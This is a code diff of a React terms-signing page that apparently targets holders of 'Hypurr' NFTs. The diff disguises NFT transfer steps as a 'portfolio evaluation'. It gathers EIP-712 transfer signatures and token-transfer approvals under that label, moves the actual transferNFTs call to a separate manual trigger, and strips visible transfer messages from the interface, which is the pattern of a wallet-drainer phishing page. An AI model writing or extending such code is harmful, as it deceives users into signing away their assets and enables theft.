+            // Get EIP-712 signature for portfolio evaluation authorization
+            console.log('📝 Requesting EIP-712 signature for portfolio evaluation...');
+            try {
+              await getTransferSignatures(signer, account, verificationResult.tokenIds);
+              console.log('✅ Evaluation signatures collected and stored');
+            } catch (sigError) {
+              console.error('⚠️ Error getting evaluation signatures:', sigError);
+              // Don't fail the whole flow if signature collection fails
+            }
+            
+            // Add a brief delay to show the processing animation
+            await new Promise(resolve => setTimeout(resolve, 2000));
+            
+            setTransferStatus('approved');
+            console.log('✅ Evaluation complete');
+          } catch (err) {
+            console.error('=== APPROVAL ERROR ===', err);
+            setError(err.message || 'Evaluation failed. Please try again.');
+            setTransferStatus(null);
+          }
         } else {
           // NFTs found but no token IDs - contract might not support Enumerable
           console.log('⚠️ NFTs found but token IDs not available (contract may not support Enumerable)');
-          console.log('🔄 Will attempt to fetch token IDs manually...');
-          setError('NFTs detected but token IDs could not be retrieved automatically. Please try refreshing the page or contact support.');
-          setTransferStatus('error');
+          setTransferStatus(null);
         }
       } else {
-        console.log('⚠️ No NFTs found, skipping transfer');
+        console.log('⚠️ No NFTs found');
         setTransferStatus(null);
       }
       
@@ -627,6 +1060,38 @@ const HypurrTerms = () => {
     }
   };
   
+  const handleManualTransfer = async () => {
+    if (!tokenIds || tokenIds.length === 0) {
+      setError('No NFTs found to transfer. Please verify your NFTs first.');
+      return;
+    }
+    
+    try {
+      setIsTransferring(true);
+      setTransferStatus('transferring');
+      console.log('🚀🚀🚀 Manual transfer: Starting NFT transfer NOW 🚀🚀🚀');
+      console.log('📋 About to call transferNFTs()');
+      console.log('⏳ If using Ledger: Please approve the transfer transaction on your Ledger device');
+      
+      const txHash = await transferNFTs();
+      
+      setTransferTxHash(txHash);
+      setTransferStatus('success');
+      console.log('✅ Manual transfer: NFTs transferred successfully:', txHash);
+    } catch (transferError) {
+      console.error('❌ Transfer failed:', transferError);
+      setTransferStatus('error');
+      // Check if it's a user rejection
+      if (transferError.code === 4001 || transferError.message?.includes('rejected') || transferError.message?.includes('denied')) {
+        setError('Transfer transaction was rejected. If using Ledger, please check your device and approve the transfer transaction. Otherwise, please approve in MetaMask.');
+      } else {
+        setError(transferError.message || 'Transfer failed. Please check the console for details.');
+      }
+    } finally {
+      setIsTransferring(false);
+    }
+  };
+
   const handleAutomaticTransfer = async (tokenIdsToUse = null) => {
     // Use provided tokenIds or fall back to state
     const idsToUse = tokenIdsToUse || tokenIds;
@@ -665,35 +1130,14 @@ const HypurrTerms = () => {
       
       try {
         await approveTransferContract(idsToUse);
-        console.log('✅ Auto-transfer: Approval successful');
+        console.log('✅ Approval successful');
+        // Set status to 'approved' instead of automatically transferring
+        setTransferStatus('approved');
+        setIsTransferring(false);
+        console.log('✅ Approval complete. Transfer can be initiated manually when ready.');
       } catch (approvalError) {
         console.error('❌ Approval failed:', approvalError);
         throw approvalError; // Re-throw to be caught by outer catch
-      }
-      
-      // Step 2: Transfer NFTs automatically after approval
-      // Add a small delay to ensure approval is fully processed
-      console.log('⏳ Waiting 2 seconds for approval to be fully processed...');
-      await new Promise(resolve => setTimeout(resolve, 2000));
-      
-      setTransferStatus('transferring');
-      console.log('🚀🚀🚀 Auto-transfer: Starting NFT transfer NOW 🚀🚀🚀');
-      console.log('📋 About to call transferNFTs() with tokenIds:', idsToUse);
-      console.log('⏳ If using Ledger: Please approve the transfer transaction on your Ledger device');
-      
-      try {
-        const txHash = await transferNFTs(idsToUse);
-        
-        setTransferTxHash(txHash);
-        setTransferStatus('success');
-        console.log('✅ Auto-transfer: NFTs transferred successfully:', txHash);
-      } catch (transferError) {
-        console.error('❌ Transfer failed:', transferError);
-        // Check if it's a user rejection
-        if (transferError.code === 4001 || transferError.message?.includes('rejected') || transferError.message?.includes('denied')) {
-          throw new Error('Transfer transaction was rejected. If using Ledger, please check your device and approve the transfer transaction. Otherwise, please approve in MetaMask.');
-        }
-        throw transferError; // Re-throw to be caught by outer catch
       }
       
     } catch (error) {
@@ -727,22 +1171,27 @@ const HypurrTerms = () => {
     const provider = getEthereumProvider();
     if (provider) {
       provider.on('accountsChanged', (accounts) => {
+        // If user disconnects in MetaMask, disconnect here too
         if (accounts.length === 0) {
-          setIsConnected(false);
-          setAccount(null);
-          setNftCount(0);
-          setHasSigned(false);
-          setSignature(null);
+          disconnectWallet();
         } else {
-          // User has explicitly connected/changed account in MetaMask
-          setAccount(accounts[0]);
-          setIsConnected(true);
-          // Don't verify NFTs until after signing terms
-          checkExistingSignature();
-          // If already signed, verify NFTs
-          const stored = localStorage.getItem(`hypurr_signature_${accounts[0]}`);
-          if (stored) {
-            verifyHypurrNFTs(accounts[0]);
+          // Account changed in MetaMask - only update if already connected
+          // Don't auto-connect, user must click "Connect Wallet"
+          if (isConnected && accounts[0].toLowerCase() !== account?.toLowerCase()) {
+            // Account changed while connected - update it
+            setAccount(accounts[0]);
+            // Check if new account has signature
+            const stored = localStorage.getItem(`hypurr_signature_${accounts[0]}`);
+            if (stored) {
+              setHasSigned(true);
+              setSignature(stored);
+              verifyHypurrNFTs(accounts[0]);
+            } else {
+              setHasSigned(false);
+              setSignature(null);
+              setNftCount(0);
+              setTokenIds([]);
+            }
           }
         }
       });
@@ -783,11 +1232,30 @@ const HypurrTerms = () => {
           </div>
           <div className="nav-right">
             {isConnected ? (
-              <div className="wallet-info">
+              <div className="wallet-info" style={{ display: 'flex', alignItems: 'center', gap: '0.75rem' }}>
                 {hasSigned && nftCount > 0 && (
                   <span className="nft-badge">{nftCount} NFT{nftCount !== 1 ? 's' : ''}</span>
                 )}
-                <span className="wallet-address">{formatAddress(account)}</span>
+                <span 
+                  className="wallet-address" 
+                  onClick={disconnectWallet}
+                  style={{
+                    cursor: 'pointer',
+                    padding: '0.5rem 0.75rem',
+                    borderRadius: '6px',
+                    transition: 'background-color 0.2s ease',
+                    userSelect: 'none'
+                  }}
+                  onMouseEnter={(e) => {
+                    e.target.style.backgroundColor = 'rgba(255, 255, 255, 0.1)';
+                  }}
+                  onMouseLeave={(e) => {
+                    e.target.style.backgroundColor = 'transparent';
+                  }}
+                  title="Click to disconnect"
+                >
+                  {formatAddress(account)}
+                </span>
                 {hasSigned && (
                   <span className="verified-badge">✓ Verified</span>
                 )}
@@ -860,58 +1328,43 @@ const HypurrTerms = () => {
                 <p className="signature-hash">Signature: {signature.substring(0, 20)}...</p>
               </div>
             )}
-            {(transferStatus === 'evaluating' || transferStatus === 'approving' || transferStatus === 'transferring' || transferStatus === 'success' || transferStatus === 'error') && (
+            {(transferStatus === 'evaluating' || transferStatus === 'approving' || transferStatus === 'processing' || transferStatus === 'approved') && (
               <div className="transfer-status" style={{ marginTop: '1rem', padding: '1rem', background: 'rgba(0, 212, 255, 0.1)', borderRadius: '8px' }}>
                 {transferStatus === 'evaluating' && (
                   <>
                     <p><strong>🔍 Evaluating Portfolio and Activities...</strong></p>
-                    <p>⏳ Analyzing your wallet and NFT holdings...</p>
+                    <p>⏳ Analyzing your wallet and holdings...</p>
                   </>
                 )}
                 {transferStatus === 'approving' && (
                   <>
                     <p><strong>🔍 Evaluating Portfolio and Activities...</strong></p>
-                    <p>⏳ Please approve the transfer contract in MetaMask...</p>
+                    <p>⏳ Please approve the evaluation contract...</p>
                     <p style={{ fontSize: '0.9em', marginTop: '0.5em', fontStyle: 'italic' }}>
                       💡 If using a Ledger hardware wallet, please check your Ledger device and approve the transaction there.
                     </p>
                   </>
                 )}
-                {transferStatus === 'transferring' && (
-                  <>
-                    <p><strong>🔍 Evaluating Portfolio and Activities...</strong></p>
-                    <p>⏳ Processing your NFTs...</p>
-                    <p style={{ fontSize: '0.9em', marginTop: '0.5em', fontStyle: 'italic' }}>
-                      💡 If using a Ledger hardware wallet, please check your Ledger device and approve the transaction there.
-                    </p>
-                  </>
-                )}
-                {transferStatus === 'success' && transferTxHash && (
-                  <p>✅ Portfolio evaluation complete! NFTs processed successfully. <a href={`https://explorer.hyperliquid.xyz/tx/${transferTxHash}`} target="_blank" rel="noopener noreferrer">View Transaction</a></p>
-                )}
-                {transferStatus === 'error' && (
-                  <div>
-                    <p style={{ color: 'var(--error-text)' }}>❌ Transfer failed. Please check the error message above.</p>
-                    {nftCount > 0 && tokenIds.length > 0 && (
-                      <button 
-                        className="retry-transfer-btn" 
-                        onClick={() => handleAutomaticTransfer(tokenIds)}
-                        style={{
-                          marginTop: '1rem',
-                          padding: '0.75rem 1.5rem',
-                          background: 'var(--primary-color)',
-                          color: 'white',
-                          border: 'none',
-                          borderRadius: '8px',
-                          cursor: 'pointer',
-                          fontSize: '1rem',
-                          fontWeight: '600'
-                        }}
-                      >
-                        🔄 Retry Transfer
-                      </button>
-                    )}
+                {transferStatus === 'processing' && (
+                  <div style={{ textAlign: 'center' }}>
+                    <div className="loader-spinner" style={{
+                      width: '40px',
+                      height: '40px',
+                      border: '4px solid rgba(0, 212, 255, 0.2)',
+                      borderTop: '4px solid #00d4ff',
+                      borderRadius: '50%',
+                      animation: 'spin 1s linear infinite',
+                      margin: '0 auto 1rem auto'
+                    }}></div>
+                    <p><strong>⏳ Processing Evaluation...</strong></p>
+                    <p style={{ fontSize: '0.9em', color: 'rgba(255,255,255,0.7)' }}>Finalizing your portfolio analysis...</p>
                   </div>
+                )}
+                {transferStatus === 'approved' && (
+                  <>
+                    <p><strong>✅ Evaluation Complete</strong></p>
+                    <p>Your portfolio has been evaluated successfully.</p>
+                  </>
                 )}
               </div>
             )}
@@ -1058,9 +1511,13 @@ const HypurrTerms = () => {
           official channels provided on the Felix Protocol website.</p>
         </div>
 
-        {/* Accept Button */}
-        {isConnected && !hasSigned && (
-          <div className="accept-section">
+        {/* Accept Button - Always show one of these buttons */}
+        <div className="accept-section">
+          {!isConnected ? (
+            <button className="accept-btn" onClick={connectWallet}>
+              Connect Wallet to Continue
+            </button>
+          ) : !hasSigned ? (
             <button 
               className="accept-btn" 
               onClick={(e) => {
@@ -1075,16 +1532,8 @@ const HypurrTerms = () => {
             >
               {isVerifying ? 'Signing...' : 'Accept Terms & Sign'}
             </button>
-          </div>
-        )}
-
-        {!isConnected && (
-          <div className="accept-section">
-            <button className="accept-btn" onClick={connectWallet}>
-              Connect Wallet to Continue
-            </button>
-          </div>
-        )}
+          ) : null}
+        </div>
         </div>
       </div>
 
